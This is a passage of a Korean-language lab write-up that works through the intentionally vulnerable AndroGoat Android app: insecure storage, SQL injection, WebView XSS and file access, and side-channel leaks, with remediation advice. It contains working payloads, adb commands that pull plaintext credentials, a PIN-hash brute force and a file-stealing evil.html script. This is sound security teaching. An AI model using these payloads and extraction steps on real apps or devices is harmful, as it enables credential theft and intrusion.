- 공격자를 **adb의 shell 사용자(uid 2000)** 로 흉내 냈다. 실제 악성 앱도 같은 Intent와 `ContentResolver`로 똑같이 할 수 있다. 다만 API 30+에서는 다른 앱의 패키지를 보려면 `<queries>`를 선언해야 한다(패키지 가시성). 이건 공격자가 자기 앱에 한 줄 추가하면 되는 조건이라 방어 수단은 아니다.
- 서비스(2-3)와 리시버 토스트(2-4)는 **최신 정책 덕분에 앱이 백그라운드일 때는 막히거나 가려졌다**. 하지만 사용자가 앱을 쓰고 있을 때는 그대로 뚫린다.
- 2-3에서 내려받는 인보이스는 고정된 공개 파일이라 실제 개인 정보는 아니다. 핵심은 **인증 없이 기능이 실행된다**는 점이다.

### 대응 방법
- 외부에 열 필요가 없는 컴포넌트는 `exported="false"`로 둔다.
- 꼭 열어야 하면 `android:permission`(가능하면 `protectionLevel="signature"`)을 건다.
- 보호해야 할 화면은 **그 화면 안에서** 인증 상태를 다시 확인한다.
- Provider는 권한을 걸고, 쿼리는 `setStrict(true)`, `setProjectionMap()`, 매개변수 바인딩으로 만든다.
- 딥링크는 검증된 App Links를 쓰고, 열린 뒤에도 인증을 확인한다.

## 3. Insecure Data Storage

> **쉽게 말하면,** 비밀번호를 일기장에 연필로 그대로 적어둔 격이다. 앱의 방에 들어가기만 하면 아이디·비밀번호가 가림 없이 다 보인다. 게임 점수도 파일만 고쳐서 멋대로 승리로 바꾼다.

<img src="/assets/androgoat/attachments/03_storage/01_storage_menu.png" alt="Storage 메뉴" width="420">

### 요약
| 하위 항목 | 저장 위치 | 꺼낸 값 | 도구 | 결과 |
|---|---|---|---|---|
| 3-1 SharedPreferences 1 | `shared_prefs/users.xml` | `alice` / `Alic3_S3cret!` (평문) | run-as, root | ✅ |
| (추가) PIN 해시 | `shared_prefs/pinDetails.xml` | MD5 → PIN `7391` 복원 (0.74초) | run-as, PC | ✅ |
| 3-2 SharedPreferences 2 | `shared_prefs/score.xml` | 점수 3 → 10000 변조 → 승리 | run-as (`sed`) | ✅ |
| 3-3 SQLite | `databases/aGoat` | `bob` / `B0b_P4ssw0rd` (평문) | sqlite3, run-as, logcat | ✅ |
| 3-4 Temp 파일 | `/data/data/.../users*tmp` | `carol` / `Car0l#Temp` (평문) | run-as | ✅ |
| 3-5 외부 저장소 | `/sdcard/Android/data/.../files/users*_tmp` | `dave` / `D4ve_Ext3rnal` (평문) | adb shell (root 불필요) | ✅ ⚠️ |

### 공통 배경: 샌드박스와 run-as
- 앱 내부 저장소 `/data/data/owasp.sat.agoat/`는 `drwx------`(소유자만 접근)다. **다른 앱이나 일반 셸은 들어갈 수 없다.** 대조 실험에서 확인했다.
  ```
  $ adb shell su shell cat /data/data/owasp.sat.agoat/shared_prefs/users.xml
  cat: ...: Permission denied
  ```
- 그런데 이 앱은 `android:debuggable=true`라서 `run-as owasp.sat.agoat`로 **앱 자신의 권한을 빌려** 들어갈 수 있다. root가 없어도 USB 디버깅만 켜져 있으면 된다.
- 기기가 루팅돼 있거나(root), 백업이 허용돼 있거나(§11 `allowBackup`), 기기를 분실한 경우 내부 저장소의 평문은 그대로 노출된다. 그래서 **"내부 저장소니까 안전하다"는 가정은 틀렸다**는 것이 이 카테고리의 핵심이다.

### 3-1. SharedPreferences: 계정 정보 평문 저장
**취약 코드** (`InsecureStorageSharedPrefs.kt`)
```kotlin
val sharedPreference = getSharedPreferences("users", Context.MODE_PRIVATE)
editor.putString("username", username.text.toString())
editor.putString("password", password.text.toString())   // 평문 그대로
```
**발화**: `alice` / `Alic3_S3cret!` 입력 → VERIFY
<img src="/assets/androgoat/attachments/03_storage/02_sp1_input.png" alt="입력" width="420"> <img src="/assets/androgoat/attachments/03_storage/03_sp1_saved.png" alt="저장됨" width="420">

**추출** ([원본](/posts/2026-11-12-ag-03_storage-04_sp1_extract_console.html))
```
$ adb shell run-as owasp.sat.agoat cat shared_prefs/users.xml
<map>
    <string name="password">Alic3_S3cret!</string>
    <string name="username">alice</string>
</map>
```

**추가: §2의 PIN 해시 복원** ([원본](/posts/2026-11-12-ag-03_storage-05_pin_md5_crack.html))
```
$ adb shell run-as owasp.sat.agoat cat shared_prefs/pinDetails.xml
    <string name="pin">88cf91a1aef212f3c2cd12406983427d</string>      ← MD5(PIN), 솔트 없음
# 0000~9999 전수 대입 (PowerShell)
cracked PIN: 7391   (시도 7392회, 0.74초)
```
→ 해시로 저장해도 **경우의 수가 1만 개뿐인 4자리 PIN**이고 솔트도 없는 MD5라 1초도 안 걸린다.

### 3-2. SharedPreferences: 점수 변조
**취약 코드** (`InsecureStorageSharedPrefs1Activity.kt`): 점수와 레벨을 기기에 저장하고, 기기의 값을 그대로 믿는다.
```kotlin
private fun checkScore(score: Int): Boolean { return score > 10000 }   // 승리 조건
editor.putInt("score", score)                                           // 무결성 검증 없음
```
**발화**: 정상적으로는 버튼 1번에 1점. 3번 눌러 3점이 됐다.
<img src="/assets/androgoat/attachments/03_storage/06_sp2_score_before.png" alt="변조 전" width="420">

**변조** ([원본](/posts/2026-11-12-ag-03_storage-07_sp2_tamper_console.html))
```
$ adb shell am force-stop owasp.sat.agoat                  ← 메모리에 캐시된 값 제거
$ adb shell run-as owasp.sat.agoat sed -i 's/name="score" value="[0-9]*"/name="score" value="10000"/' shared_prefs/score.xml
$ adb shell run-as owasp.sat.agoat cat shared_prefs/score.xml
    <int name="score" value="10000" />
```
**결과**: 앱을 다시 열면 점수가 10000. 버튼을 한 번 누르니 10001 → **"You won the game"**, Level 2
<img src="/assets/androgoat/attachments/03_storage/08_sp2_score_tampered_loaded.png" alt="변조값 로드" width="420"> <img src="/assets/androgoat/attachments/03_storage/09_sp2_won_game.png" alt="승리" width="420">

→ 게임 점수, 포인트, 유료 기능 잠금 해제 여부 같은 **중요한 상태를 클라이언트에만 두면 사용자가 바꿀 수 있다.**

### 3-3. SQLite: 계정 정보 평문 저장
**취약 코드** (`InsecureStorageSQLiteActivity.kt`)
```kotlin
mDB = openOrCreateDatabase("aGoat", 0, null)
val qry = "INSERT INTO users (username, password) VALUES('${username.text}','${password.text}')"
mDB?.execSQL(qry)
Log.v("Query", qry)          // 쿼리(비밀번호 포함)를 로그에도 출력
```
**발화**: `bob` / `B0b_P4ssw0rd` 입력 → VERIFY
<img src="/assets/androgoat/attachments/03_storage/10_sqlite_input.png" alt="입력" width="420"> <img src="/assets/androgoat/attachments/03_storage/11_sqlite_saved.png" alt="저장됨" width="420">

**추출: 3가지 경로** ([원본](/posts/2026-11-12-ag-03_storage-12_sqlite_extract_console.html))
```
# ① sqlite3로 직접 조회
$ adb shell sqlite3 -header /data/data/owasp.sat.agoat/databases/aGoat 'SELECT * FROM users;'
ID|username|password
1|bob|B0b_P4ssw0rd

# ② run-as로 DB 파일을 PC로 복사 (root 불필요) → 03_storage/aGoat.db
$ adb exec-out run-as owasp.sat.agoat cat databases/aGoat > aGoat.db
  → 20480 bytes, 파일 시그니처: SQLite format 3
  → 바이너리 안에 'bobB0b_P4ssw0rd' 그대로 존재

# ③ logcat (앱이 쿼리 원문을 로그로 출력)
$ adb logcat -d -s Query:V
V Query   : INSERT INTO users (username, password) VALUES('bob','B0b_P4ssw0rd')
```
- 같은 코드는 입력값을 문자열로 이어 붙여 쿼리를 만든다. 그래서 SQL 인젝션에도 취약하다(§4에서 다룸).

### 3-4. Temp 파일: 계정 정보 평문 저장
**취약 코드** (`InsecureStorageTempActivity.kt`)
```kotlin
val userinfo = File.createTempFile("users", "tmp", File(applicationInfo.dataDir))
userinfo.setReadable(true); userinfo.setWritable(true)
fw.write("username is " + username.text + "\n")
fw.write("password is " + password.text + "\n")
```
**발화**: `carol` / `Car0l#Temp` 입력 → VERIFY
<img src="/assets/androgoat/attachments/03_storage/13_temp_input.png" alt="입력" width="420"> <img src="/assets/androgoat/attachments/03_storage/14_temp_saved.png" alt="저장됨" width="420">

**추출** ([원본](/posts/2026-11-12-ag-03_storage-15_temp_extract_console.html))
```
$ adb shell run-as owasp.sat.agoat ls -l
-rw------- 1 u0_a174 u0_a174   41 2026-11-12 03:54 users689386731629139472tmp
$ adb shell run-as owasp.sat.agoat sh -c 'cat users*tmp'
username is carol
password is Car0l#Temp
```
- "임시" 파일이라는 이름과 달리 **삭제하는 코드가 없다.** 입력할 때마다 파일이 하나씩 쌓인다.
- ⚠️ `setReadable(true)`는 기본값이 "소유자만"이라 실제 권한은 `-rw-------`이었다. 그래서 다른 앱이 바로 읽을 수는 없다(대조 실험: `Permission denied`). 위험은 3-1과 같은 수준이다.

### 3-5. 외부 저장소: 계정 정보 평문 저장
**취약 코드** (`InsecureStorageSDCardActivity.kt`)
```kotlin
val data = "This data is stored in SdCard on ${Date()}: \n Username - ${username.text} Password -${password.text}\n"
val userinfo = File.createTempFile("users", "_tmp", getExternalFilesDir(null))
Log.i("Info", "Data saved to" + userinfo.absolutePath)     // 저장 경로까지 로그에 출력
```
**발화**: `dave` / `D4ve_Ext3rnal` 입력 → VERIFY
<img src="/assets/androgoat/attachments/03_storage/16_sdcard_input.png" alt="입력" width="420"> <img src="/assets/androgoat/attachments/03_storage/17_sdcard_saved.png" alt="저장됨" width="420">

**추출: root나 run-as 없이 adb 일반 권한으로** ([원본](/posts/2026-11-12-ag-03_storage-18_sdcard_extract_console.html))
```
$ adb logcat -d -s Info:I
I Info    : Data saved to/storage/emulated/0/Android/data/owasp.sat.agoat/files/users3034063995996941852_tmp

$ adb shell su shell sh -c 'cat /sdcard/Android/data/owasp.sat.agoat/files/users*_tmp'
This data is stored in SdCard on Thu Nov 12 03:55:14 GMT 2026:
 Username - dave Password -D4ve_Ext3rnal
```
**대조: 다른 앱(Chrome UID 10125)으로 접근하면 차단됨** ([원본](/posts/2026-11-12-ag-03_storage-19_sdcard_other_app_control.html))
```
$ adb shell su 10125 sh -c 'cat /sdcard/Android/data/owasp.sat.agoat/files/users*_tmp'
cat: ...: Permission denied
```

### 정책 vs 코드 (targetSdk 33)
| 정책 | 효과 | 이 앱 |
|---|---|---|
| 앱 샌드박스 (`/data/data/<pkg>` 700) | 다른 앱은 내부 저장소 접근 불가 | `debuggable=true` → `run-as`로 우회. 루팅 기기, 백업 경로에는 무력 |
| API 29+ Scoped Storage, API 30+ `Android/data` 앱별 격리 | 다른 앱은 3-5 파일 접근 불가 (대조 실험) | 하지만 adb(USB 디버깅, 물리 접근)로는 root 없이 읽힘 ⚠️ |
| API 30+에서 `WRITE_EXTERNAL_STORAGE` 무효 | 공용 영역에 아무렇게나 쓰기 제한 | 앱은 권한이 필요 없는 앱 전용 외부 경로를 써서 저장 자체는 성공 |
| (OS 차원의 자동 암호화 없음) | SharedPreferences, SQLite는 평문 파일 | 암호화를 앱이 직접 해야 하는데 하지 않음 |

###  한계
- 3-1~3-4는 **앱 내부 저장소**라서 다른 앱이 바로 훔칠 수는 없다. 실제 공격에는 기기 접근(USB 디버깅), 루팅, 백업 경로 중 하나가 필요하다. 이번 실습에서는 `debuggable` 빌드라 `run-as`로 쉽게 접근했다. 릴리스 빌드였다면 root가 필요했을 것이다.
- 3-5의 대조 실험은 `su <uid>`로 UID만 바꾼 **근사 실험**이다. 실제 악성 앱(SELinux `untrusted_app` 도메인)은 더 많이 제한되므로 결과는 같거나 더 엄격하다.
- 이 앱은 `minSdkVersion 19`라서 **Android 9 이하 기기에도 설치된다**. 그런 기기에서는 3-5 파일을 `READ_EXTERNAL_STORAGE` 권한만 있는 아무 앱이나 읽을 수 있다. 이번 실습(API 33)에서는 재현 대상이 아니다.

### 대응 방법
- 비밀번호는 기기에 저장하지 않는다. 꼭 필요하면 토큰만 저장하고, **Android Keystore 기반 암호화**(Jetpack Security `EncryptedSharedPreferences`, SQLCipher 등)를 쓴다.
- PIN 같은 짧은 비밀은 Keystore + 시도 횟수 제한, 또는 서버 검증을 쓴다. 단순 해시는 소용없다.
- 점수, 결제 상태 같은 중요한 값은 **서버가 판단**하거나 서명/HMAC으로 무결성을 검증한다.
- 민감한 데이터는 외부 저장소에 쓰지 않는다. 임시 파일은 쓰고 나서 바로 지운다.
- 릴리스 빌드에서는 `debuggable=false`, `allowBackup=false`(또는 백업 규칙)로 설정한다.

## 4. Input Validations

> **쉽게 말하면,** 앱이 사용자가 적은 글을 곧이곧대로 믿고 명령처럼 실행한다. 그래서 장난 글을 심으면 앱이 속아서 경고창을 띄우거나(XSS), 남의 비밀번호를 다 뱉거나(SQL 인젝션), 폰 속 파일을 훔쳐 읽는다.

<img src="/assets/androgoat/attachments/04_input_validations/01_menu.png" alt="Input Validations 메뉴" width="420">

### 요약
| 하위 항목 | 결과 | 핵심 증거 |
|---|---|---|
| 4-1 XSS (WebView) | ✅ 입력값이 JavaScript로 실행됨 | `alert(navigator.userAgent)` 실행 |
| 4-2 SQL 인젝션 | ✅ 전체 사용자 덤프, UNION으로 DB 구조 확인 | `bob / B0b_P4ssw0rd` |
| 4-3 WebView 파일 접근 | ✅ `file://`로 내부 파일 열람 + 외부 HTML이 내부 파일 탈취 | `users.xml`, `pinDetails.xml` |
| 4-4 QR 코드 XSS | ✅ QR 내용이 HTML에 그대로 삽입돼 실행됨 ⚠️ 카메라 대신 Frida로 주입 | `alert('QR XSS: ...')` |
| 4-5 OS 명령 인젝션 (메뉴에 없음) | ⚠️ 쉘 명령 주입은 **불가**, 인자 주입만 가능 | `;id` 미실행, `-c 2` 반영 |

### 4-1. XSS (WebView)
**취약 코드** (`XSSActivity.kt`)
```kotlin
webSettings.javaScriptEnabled = true
// HTML 안의 스크립트
function displayContent() {
    var a = document.getElementById("name");
    document.write(a.value);          // 입력값을 HTML로 그대로 출력
}
```
**발화**: Name 칸에 다음을 입력하고 Display를 누른다.
```html
<img src=x onerror=alert(navigator.userAgent)>
```
<img src="/assets/androgoat/attachments/04_input_validations/02_xss_screen.png" alt="XSS 화면" width="420"> <img src="/assets/androgoat/attachments/04_input_validations/03_xss_payload_input.png" alt="페이로드 입력" width="420">

**결과**: 이미지 로드가 실패하면서 `onerror`의 JavaScript가 실행됐다. WebView의 User-Agent(Android 13, Chrome 109 WebView)가 alert로 떴다.
<img src="/assets/androgoat/attachments/04_input_validations/04_xss_alert_executed.png" alt="XSS 실행" width="420">

- 이 화면은 입력한 사람과 보는 사람이 같아서(Self-XSS) 직접 피해는 작다.
- 하지만 같은 패턴이 **서버에서 받은 데이터**나 **다른 사용자가 입력한 값**에 쓰이면, 그 사람 기기의 WebView에서 공격자 스크립트가 실행된다. 4-4가 그런 예다.

### 4-2. SQL 인젝션
**취약 코드** (`SQLinjectionActivity.kt`)
```kotlin
val qry = "SELECT * FROM users WHERE username='" + username.text + "'"
val qryResult = mDB?.rawQuery(qry, null)
```
**① 정상 입력** `nobody` → `User: (nobody) not found`
<img src="/assets/androgoat/attachments/04_input_validations/05_sqli_normal_notfound.png" alt="정상 검색" width="420">

**② 인젝션** `' OR '1'='1` → 조건이 항상 참이 되어 **모든 사용자와 비밀번호**가 출력된다.
<img src="/assets/androgoat/attachments/04_input_validations/06_sqli_payload_input.png" alt="페이로드" width="420"> <img src="/assets/androgoat/attachments/04_input_validations/07_sqli_dump_all.png" alt="전체 덤프" width="420">

**③ UNION** `x' UNION SELECT 1,sqlite_version(),group_concat(name) FROM sqlite_master--` → DB 엔진 버전과 테이블 목록
<img src="/assets/androgoat/attachments/04_input_validations/08_sqli_union.png" alt="UNION" width="420">

logcat에도 실제 실행된 쿼리와 결과가 남는다 ([원본](/posts/2026-11-12-ag-04_input_validations-09_sqli_logcat.html))
```
V Query      : SELECT * FROM users WHERE username='' OR '1'='1'
E QueryResult: Username: (bob) password: (B0b_P4ssw0rd)
V Query      : SELECT * FROM users WHERE username='x' UNION SELECT 1,sqlite_version(),group_concat(name) FROM sqlite_master--'
E QueryResult: Username: (3.32.2) password: (android_metadata,users,sqlite_sequence)
```
- ⚠️ 화면의 안내는 "사용자 2명 이상"을 만들라고 하지만, 이번 실습에서는 §3-3에서 만든 `bob` 1명만 있었다. `OR 1=1`이 조건을 무력화한다는 것은 같다.
- 로컬 DB라서 공격자가 "자기 기기의 데이터"를 보는 것이 기본 상황이다. 하지만 같은 코드가 §2-5처럼 **외부에 열린 Provider**나 서버에 있으면 그대로 원격 데이터 유출이 된다.

### 4-3. WebView 파일 접근
**취약 코드** (`InputValidationsWebViewURLActivity.kt`)
```kotlin
webViewSettings.javaScriptEnabled = true
webViewSettings.allowFileAccess = true                      // file:// 허용
webViewSettings.allowContentAccess = true
webViewSettings.allowFileAccessFromFileURLs = true          // file:// 페이지가 다른 file:// 읽기 허용
webViewSettings.allowUniversalAccessFromFileURLs = true     // file:// 페이지가 아무 출처나 읽기 허용
webView.loadUrl(urlEditText.text.toString())                // 입력 URL 검증 없음
```
<img src="/assets/androgoat/attachments/04_input_validations/10_webview_screen.png" alt="WebView 화면" width="420">

**① URL에 앱 내부 파일 경로 입력**
```
file:///data/data/owasp.sat.agoat/shared_prefs/users.xml
```
→ §3-1에서 저장한 계정 정보가 WebView에 그대로 표시됐다.
<img src="/assets/androgoat/attachments/04_input_validations/11_webview_file_read_users_xml.png" alt="내부 파일 열람" width="420">

**② 외부 저장소에 둔 공격자 HTML이 내부 파일을 훔침** ([`evil.html`](/posts/2026-11-12-ag-04_input_validations-evil-html.html))
- `adb`(shell 권한)로 앱의 외부 저장소 폴더에 `evil.html`을 넣었다. 이 폴더는 앱 자신이 권한 없이 읽을 수 있는 곳이다.
- URL에 `file:///sdcard/Android/data/owasp.sat.agoat/files/evil.html`을 입력했다.
```javascript
var x = new XMLHttpRequest();
x.open("GET", "file:///data/data/owasp.sat.agoat/shared_prefs/users.xml", false);
x.send();
out.textContent += x.responseText;
```
→ 외부 파일의 JavaScript가 **앱 샌드박스 안의 `users.xml`과 `pinDetails.xml`을 읽어 화면에 출력**했다. 실제 공격이라면 이 내용을 서버로 보낸다.
<img src="/assets/androgoat/attachments/04_input_validations/12_webview_evil_html_steal.png" alt="evil.html 탈취" width="420">

- 트러블슈팅: 처음에 root로 `adb push`한 파일은 소유자가 `root`라서 앱이 읽지 못했다(`ERR_FILE_NOT_FOUND`). shell 사용자로 다시 복사하니(`shell:ext_data_rw`) 열렸다.

### 4-4. QR 코드 XSS
**취약 코드** (`QRCodeXSSActivity.kt`)
```kotlin
webView.settings.javaScriptEnabled = true
codeScanner.decodeCallback = DecodeCallback {
    val scannedText = it.text
    val htmlData = """ ... <p>Product ID: <b>$scannedText</b></p> ... """   // 스캔 내용을 HTML에 그대로
    webView.loadData(htmlData, "text/html", "UTF-8")
}
```
**발화**: 에뮬레이터에는 실제 카메라가 없어서, **QR 디코더가 문자열을 읽어낸 직후 단계**를 Frida로 재현했다. 앱의 `DecodeCallback`에 zxing `Result` 객체를 만들어 직접 넘겼다. ([`frida/inject-qr-result.js`](/posts/2026-11-12-ag-frida-inject-qr-result.html), [콘솔](/posts/2026-11-12-ag-04_input_validations-14_qr_frida_console.html))
```javascript
var res = Result.$new(PAYLOAD, null, null, Format.QR_CODE.value);
cb.onDecoded(res);
```
페이로드 (= QR 코드에 담을 문자열)
```html
<img src=x onerror="alert('QR XSS: ' + document.body.innerText.substring(0,40))">
```
<img src="/assets/androgoat/attachments/04_input_validations/13_qr_screen.png" alt="QR 화면" width="420">

**결과**: 페이지 본문("Scanned Product Details / Product Found!")을 읽은 JavaScript가 실행됐다.
<img src="/assets/androgoat/attachments/04_input_validations/15_qr_xss_alert.png" alt="QR XSS 실행" width="420">

- ⚠️ 한계: 카메라로 실제 QR 이미지를 찍는 과정은 생략하고, 디코딩 결과를 주입했다. 앱 코드 입장에서는 실제 스캔과 같은 입력(`it.text`)이 들어간다.
- 현실 시나리오: 공격자가 상품 QR 스티커를 바꿔 붙이면, 스캔한 사용자의 WebView에서 스크립트가 실행된다.

### 4-5. OS 명령 인젝션  (메뉴에 없는 화면)
- `InputValidationsOSCMDInjectionMain2Activity`는 **앱 메뉴 어디에서도 연결되지 않고**, `exported`도 아니다. 그래서 root 권한으로 직접 실행해서 확인했다(`adb shell am start -n .../.InputValidationsOSCMDInjectionMain2Activity`).
- 화면의 Objectives 문구는 SQLi 화면 것을 그대로 복사해 둔 상태다. 개발 중인 화면으로 보인다.

**취약 코드**
```kotlin
val ip1 = "ping " + ip.text.toString()
val p = Runtime.getRuntime().exec(ip1)
```
**결과**
| 입력 | 결과 | 해석 |
|---|---|---|
| `-c 2 127.0.0.1` | ping 2회 실행 결과 출력 | ✅ **인자(옵션) 주입** 가능 |
| `127.0.0.1;id` | 출력 없음 | ❌ `;` 뒤의 `id`가 실행되지 않음 |

<img src="/assets/androgoat/attachments/04_input_validations/16_oscmd_argument_injection.png" alt="인자 주입" width="420"> <img src="/assets/androgoat/attachments/04_input_validations/17_oscmd_semicolon_not_injected.png" alt="세미콜론 미동작" width="420">

- **정직한 결론**: `Runtime.exec(String)`은 쉘을 거치지 않는다. 문자열을 공백으로 잘라서 `ping`에 인자로 넘길 뿐이다. 그래서 `;`, `|`, `&&` 같은 쉘 문법은 동작하지 않고, **"OS 명령 인젝션"은 성립하지 않는다.**
- 그래도 `ping`의 옵션을 마음대로 넣을 수 있는 **인자 주입**은 된다. 예를 들어 `-c` 없이 실행하면 ping이 끝나지 않아 `p.waitFor()`에서 UI 스레드가 멈춘다(앱 응답 없음).
- 만약 코드가 `exec(arrayOf("sh", "-c", "ping " + input))`이었다면 진짜 명령 인젝션이 됐을 것이다.

### 정책 vs 코드 (targetSdk 33)
| 정책 | 효과 | 이 앱 |
|---|---|---|
| API 30+: `allowFileAccess` 기본값 `false` | `file://` 로딩 차단 | `allowFileAccess = true`로 **직접 다시 켬** |
| API 16+: `allowFileAccessFromFileURLs`, `allowUniversalAccessFromFileURLs` 기본값 `false` | file 페이지의 교차 출처 읽기 차단 | 둘 다 `true`로 **직접 켬** → 4-3 ② 성립 |
| WebView JavaScript 기본값 `false` | 스크립트 실행 차단 | `javaScriptEnabled = true` → 4-1, 4-4 성립 |
| (SQL 인젝션은 OS 정책 대상이 아님) | – | 문자열 연결로 쿼리를 만들어 SQLi 발생 |
| 앱 샌드박스 | 다른 앱은 내부 파일 접근 불가 | WebView가 **앱 권한으로** 파일을 읽어 주기 때문에 샌드박스 우회 |

### 대응 방법
- WebView는 꼭 필요할 때만 JavaScript를 켜고, `allowFileAccess`와 `allow*FromFileURLs`는 끈다. 로컬 콘텐츠는 `WebViewAssetLoader`(`https://appassets.androidplatform.net`)로 제공한다.
- `loadUrl()` 전에 허용 목록(스킴, 호스트)으로 URL을 검증한다.
- HTML에 넣는 값은 반드시 이스케이프한다(`Html.escapeHtml` 등). `document.write` 대신 `textContent`를 쓴다.
- SQL은 `rawQuery(sql, arrayOf(arg))` 같은 **매개변수 바인딩**을 쓴다.
- 외부 명령은 꼭 필요할 때만, 인자 배열(`ProcessBuilder(listOf("ping", "-c", "1", ip))`)과 입력 형식 검증(IP 정규식)을 함께 쓴다.

## 5. Side Channel Data Leakage

> **쉽게 말하면,** 비밀을 말할 때 벽에 메아리가 남아 옆방에서 들리는 것과 같다. 앱이 비밀번호를 일기장(로그), 복사판(클립보드), 키보드 학습장에 흘리고, 다른 데서 그걸 주워 읽는다.

<img src="/assets/androgoat/attachments/05_side_channel/01_menu.png" alt="Side Channel 메뉴" width="420">

"측면 채널"은 앱이 데이터를 **의도한 저장소가 아닌 곳**(로그, 클립보드, 키보드 학습 데이터 등)에 흘리는 문제다.

### 요약
| 하위 항목 | 새는 곳 | 꺼낸 값 | 도구 | 결과 |
|---|---|---|---|---|
| 5-1 Insecure Logging | logcat | `erin` / `Er1n_L0gged!` | logcat | ✅ |
| 5-2 Clipboard | 시스템 클립보드 | OTP `1376` | Frida (다른 앱 프로세스) | ✅ 다른 앱이 포그라운드일 때만 ⚠️ |
| 5-3 Keyboard Cache | Gboard 학습 DB | `zebrasecret77` | root, sqlite/grep | ✅ |

### 5-1. Insecure Logging
**취약 코드** (`InsecureLoggingActivity.kt`)
```kotlin
val logMessage = "Username: ${username.text} and Password: ${password.text} are verified"
Log.i("Info:", logMessage)
System.out.println(logMessage)
```
**발화**: `erin` / `Er1n_L0gged!` 입력 → VERIFY
<img src="/assets/androgoat/attachments/05_side_channel/02_logging_input.png" alt="입력" width="420"> <img src="/assets/androgoat/attachments/05_side_channel/03_logging_verified.png" alt="검증" width="420">

**추출** ([원본](/posts/2026-11-12-ag-05_side_channel-04_logging_logcat.html))
```
$ adb logcat -d --pid=11992 | findstr /i "Password"
I Info:   : Username: erin and Password: Er1n_L0gged! are verified
I System.out: Username: erin and Password: Er1n_L0gged! are verified
```
**대조**: 다른 앱 UID(`su 10125 logcat -d`)로는 이 로그가 한 줄도 보이지 않았다.

- Android 4.1부터 `READ_LOGS`는 시스템 권한이라 **일반 앱은 다른 앱의 로그를 읽을 수 없다**.
- 하지만 USB 디버깅이 켜진 PC, 버그 리포트(`adb bugreport`), 기기 제조사나 MDM의 로그 수집, 크래시 리포팅 SDK 등을 통해 로그는 쉽게 밖으로 나간다.
- 같은 문제가 §3-3(`Log.v("Query", ...)`), §3-5(`Log.i("Info", 저장 경로)`), §4-2(`Log.e("QueryResult", ...)`)에도 있다.

### 5-2. Clipboard
**취약 코드** (`ClipboardActivity.kt`)
```kotlin
val otp = (1000..9999).shuffled().first()
val clip = ClipData.newPlainText("CC Card", otp.toString())   // OTP를 시스템 클립보드에 복사
clipboard.setPrimaryClip(clip)
```
**발화**: 카드 번호 `4111111111111111` 입력 → GENERATE AND COPY OTP → OTP `1376`
<img src="/assets/androgoat/attachments/05_side_channel/05_clipboard_input.png" alt="입력" width="420">

Android 13은 복사하면 **화면 왼쪽 아래에 클립보드 미리보기(1376)** 를 띄운다. 민감 정보 표시(`ClipDescription.EXTRA_IS_SENSITIVE`)를 하지 않았기 때문에 값이 그대로 보인다.
<img src="/assets/androgoat/attachments/05_side_channel/06_clipboard_otp_copied.png" alt="OTP 복사 + 미리보기" width="420">

Gboard 추천 바에도 클립보드 내용이 칩으로 뜬다. 다른 앱의 입력칸에서도 마찬가지다.
<img src="/assets/androgoat/attachments/05_side_channel/12_gboard_suggests_clipboard_otp.png" alt="Gboard 클립보드 칩" width="420">

**추출: "다른 앱"이 읽을 수 있는가?** Chrome 프로세스를 다른 앱이라고 가정하고, Frida로 그 안에서 `ClipboardManager.getPrimaryClip()`을 호출했다. ([원본](/posts/2026-11-12-ag-05_side_channel-08_clipboard_other_app_frida.html), 스크립트 [`frida/read-clipboard.js`](/posts/2026-11-12-ag-frida-read-clipboard.html))
```
## [1] Chrome이 백그라운드 (AndroGoat가 화면에 있음)
[com.android.chrome] getPrimaryClip() = null (접근 거부)
logcat: E ClipboardService: Denying clipboard access to com.android.chrome, application is not in focus ...

## [2] Chrome이 포그라운드 (사용자가 Chrome으로 전환)
[com.android.chrome] label=host clipboard  text=1376
logcat: I ClipboardService: Chrome pasted from your clipboard
```
<img src="/assets/androgoat/attachments/05_side_channel/07_clipboard_read_by_other_app_fg.png" alt="다른 앱 포그라운드" width="420">

- ⚠️ label이 `CC Card`가 아니라 `host clipboard`로 바뀐 이유: **에뮬레이터가 클립보드를 호스트 PC와 동기화**하기 때문이다. 즉 이 OTP는 PC 클립보드에도 복사됐다. 클라우드 클립보드 동기화가 있는 실제 기기에서도 비슷한 일이 생길 수 있다.
- "Chrome pasted from your clipboard" 토스트(Android 12+)는 캡처하는 순간 이미 사라져서, logcat 기록으로 대신했다.

### 5-3. Keyboard Cache
**취약 레이아웃** (`activity_keyboard_cache.xml`): password 칸에 `android:inputType`이 **없다**.
- 키보드는 이 칸을 일반 텍스트로 받는다(가림 처리, 학습 제외가 되지 않음).
- 비교: Insecure Logging 화면의 password 칸은 `inputType="textPassword"`라서 `0x81(Password)`로 전달된다.

**확인: 키보드(Gboard)가 받은 입력칸 정보** ([원본](/posts/2026-11-12-ag-05_side_channel-16_ime_inputtype.html))
```
Keyboard Cache  username : inputType=0x20001(Normal)
Keyboard Cache  password : inputType=0x20001(Normal)      ← 비밀번호 칸인데 일반 텍스트
Insecure Logging password: inputType=0x81(Password)       ← 정상
```
<img src="/assets/androgoat/attachments/05_side_channel/09_keyboard_cache_screen.png" alt="화면" width="420">

**발화**: password 칸에 키보드로 `zebrasecret`를 입력 → 화면에 **평문으로 표시**되고, 맞춤법 검사 밑줄까지 그어진다.
<img src="/assets/androgoat/attachments/05_side_channel/13_keyboard_typed_via_gboard.png" alt="평문 입력" width="420">

**결과 ①: 키보드가 비밀번호를 학습해서 추천한다.** 같은 칸에 `zeb`만 쳤는데 추천 바에 **`zebrasecret77`** 이 떴다. 이 추천은 다른 앱에서 `zeb`를 칠 때도 뜬다.
<img src="/assets/androgoat/attachments/05_side_channel/14_gboard_suggests_learned_password.png" alt="학습된 비밀번호 추천" width="420">

**결과 ②: 키보드 앱의 학습 DB에 저장된다** (root) ([원본](/posts/2026-11-12-ag-05_side_channel-15_gboard_training_cache.html))
```
$ adb shell grep -rl zebrasecret /data/data/com.google.android.inputmethod.latin
/data/data/com.google.android.inputmethod.latin/databases/trainingcachev3.db

$ adb shell grep -a -o '...zebrasecret...' trainingcachev3.db
zebrasecret77"
zebrasecret7@
...
```
- 처음에 `adb shell input text`로 넣은 `zebrasecret77`도 학습됐다. 화면 키를 직접 탭해서 넣은 `zebrasecret`와 함께 저장됐다.

### 정책 vs 코드 (targetSdk 33)
| 정책 | 효과 | 이 앱 |
|---|---|---|
| `READ_LOGS`는 시스템 권한 (API 16+) | 다른 앱은 로그 못 읽음 (대조 실험) | 비밀번호를 로그에 남겨 adb, 버그 리포트로 유출 |
| API 29+: 포커스 없는 앱의 클립보드 읽기 차단 | 백그라운드 앱 차단 (`Denying clipboard access`) | 사용자가 다른 앱으로 넘어가면 그 앱이 읽음 ⚠️ |
